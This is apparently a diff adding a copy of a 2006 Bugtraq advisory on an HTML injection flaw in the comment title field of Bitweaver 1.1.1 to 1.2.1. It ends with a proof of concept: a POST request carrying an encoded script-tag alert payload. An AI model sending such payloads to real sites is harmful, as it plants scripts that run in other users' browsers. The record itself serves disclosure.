@@ -1,0 +1,101 @@
+#SpeeDr00t@Black Falcon<br>#bid16973<p><b><span style="font-size: 18pt;">Bitweaver Title Field HTML Injection Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/16973/info">info</a><br><a href="http://www.securityfocus.com/bid/16973/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/16973/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/16973/solution">solution</a><br><a href="http://www.securityfocus.com/bid/16973/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				16973
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 06 2006 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 09 2006 06:45AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Kiki is credited with the discovery of this vulnerability.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Bitweaver Bitweaver 1.2.1 <br/>
+					
+				
+					Bitweaver Bitweaver 1.2 <br/>
+					
+				
+					Bitweaver Bitweaver 1.1.1  beta<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	This issue can be exploited with a web browser. <br/> <br/> The following proof of concept is available:<br/> <br/> http://www.exapmle.com/patch/read.php?article_id=7#editcomments<br/> POST /articles/read.php?article_id=7 HTTP/1.1<br/> Host: http://www.exapmle.com<br/> User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it-IT; rv:1.7.12) Gecko/20050919 Firefox/1.0.7<br/> Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5<br/> Accept-Language: it,it-it;q=0.8,en-us;q=0.5,en;q=0.3<br/> Accept-Encoding: gzip,deflate<br/> Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7<br/> Keep-Alive: 300<br/> Connection: keep-alive<br/> Referer: http://www.exapmle.com/articles/read.php?article_id=7<br/> Cookie: mod_usertrack=82.56.164.250.1141558144377994; BWSESSION=v5a6krvki42h0puv48dc5coki0; tz_offset=3600; tiki-user-bitweaver=616706c4d6f7bdf68b30893f860cbb2b<br/> Content-Type: application/x-www-form-urlencoded<br/> Content-Length: 265<br/> tk=c67481b438f7be3da147&amp;comments_maxComments=10&amp;comments_style=threaded&amp;comments_sort_mode=commentDate_desc&amp;post_comment_reply_id=&amp;post_comment_id=&amp;comment_title=hacking&amp;comment_data=your_name_logged&amp;post_comment_submit=Post<br/> <br/> but we can modify the request POST in this way:<br/> <br/> tk=c67481b438f7be3da147&amp;comments_maxComments=10&amp;comments_style=threaded&amp;comments_sort_mode=commentDate_desc&amp;post_comment_reply_id=&amp;post_comment_id=&amp;comment_title=%3Cscript%3Ealert%28%22lol%22%29%3B%3C%2Fscript%3E&amp;comment_data=your_name_logged&amp;post_comment_submit=Post
+	
+		<ul>
+</ul>
+</div>
